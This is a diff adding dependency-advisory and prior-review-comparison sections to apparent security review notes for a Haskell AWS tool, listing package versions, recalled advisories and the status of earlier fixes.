+** 7. Dependency advisories
+:PROPERTIES:
+:ID: org:01a1e68e-1584-74b8-b152-a942dc3a3efa
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+Versions from =dist-newstyle/cache/plan.json= (compiler ghc-9.12.3; nixpkgs
+pin =5d2b81a7= in =flake.lock=). Direct dependencies:
+aeson 2.2.4.1, aeson-pretty 0.8.10, amazonka / amazonka-core /
+amazonka-cloudformation / amazonka-s3 / amazonka-ssm / amazonka-sts 2.0,
+ansi-terminal 1.1.5, array 0.5.8.0, async 2.2.6, bytestring 0.12.2.0,
+conduit 1.3.6.1, containers 0.7, crypton 1.0.6, directory 1.3.9.0,
+edit-distance 0.2.2.1, filepath 1.5.4.0, HsYAML 0.2.1.5, http-client 0.7.19,
+http-client-tls 0.3.6.4, http-conduit 2.3.9.1, http-types 0.12.4,
+memory 0.18.0, microlens 0.4.14.0, network 3.2.8.0,
+optparse-applicative 0.18.1.0, prettyprinter 1.7.1, process 1.6.26.1,
+random 1.2.1.3, regex-tdfa 1.3.2.5, resourcet 1.3.0, scientific 0.3.8.1,
+stm 2.5.3.1, terminal-size 0.3.4, text 2.1.3, time 1.14,
+transformers 0.6.1.2, unix 2.8.7.0, uuid 1.3.16.1, vector 0.13.2.0.
+Security-relevant transitive: tls 2.1.8, crypton-x509 1.7.7,
+crypton-x509-validation 1.6.14, crypton-connection 0.4.5, xml-conduit
+1.10.1.0, zlib 0.7.1.1, base 4.21.1.0.
+
+Advisories I am aware of (Haskell Security Response Team database, from
+memory): aeson hash-flooding (HSEC-2023-0001) fixed in 2.0.1.0, plan is past
+it; process Windows batch-file argument injection (HSEC-2024-0003) fixed in
+1.6.19.0, plan is past it and the platform is Linux; xml-conduit entity
+expansion (HSEC-2023-0004) fixed in 1.9.1.0, plan is past it; base/text
+related Windows and unicode advisories do not apply to these versions.
+I know of no open advisory against the listed versions of tls, crypton,
+http-client, HsYAML, amazonka or regex-tdfa. Observations rather than
+advisories: amazonka 2.0 dates from 2023 and has seen little maintenance,
+so newer AWS credential mechanisms and any signing fixes are absent;
+=memory= 0.18.0 is the unmaintained predecessor of =ram= and is pulled in
+alongside crypton. Not checked: anything published after mid-2026, the
+current state of the advisory database, and C libraries in the Nix closure.
+
+* Comparison with the March 2026 review
+:PROPERTIES:
+:ID: org:01a1e68e-1584-74b8-b152-a9411d9703b0
+:ADDED: [2026-11-16 Mon 15:50]
+:END:
+
+Consulted only after the analysis above:
+=notes/archive/handoffs/done/2026-03-01-security-review-fixes.md=.
+
+- Fix A (dispatcher must go through =parseImportType=): still in place
+  (=Dispatch.hs:52-56=); no regression. The gate's own classification
+  weakness (first High finding) was not part of that fix and is new here.
+- Fix B (regex pattern length cap): still in place in both validators.
+- Fix C (HTTP timeout and size cap): still in place and now streaming, with
+  an equivalent cap on S3. Remaining gap: the timeout is a response-header
+  timeout, not an overall deadline (covered in the resource-limits finding).
+- Commit =371025c= (get-import builds an AWS env): reviewed; the env is built
+  only for AWS-backed types and the base location is the fixed local ="."=.
+  It adds one more place where =Amazonka.Error= is formatted with =show=
+  (session-token finding).
+- The GHC 9.12.3 / nixpkgs move introduced no dependency with a known
+  advisory that I am aware of.
+
+Not covered by the March fix notes at all, as far as I can see: exfiltration
+through remote-allowed import types and inherited variables, approval
+enforcement, bootstrap credential mismatch, terminal control characters,
+demo temp directory, NTP.
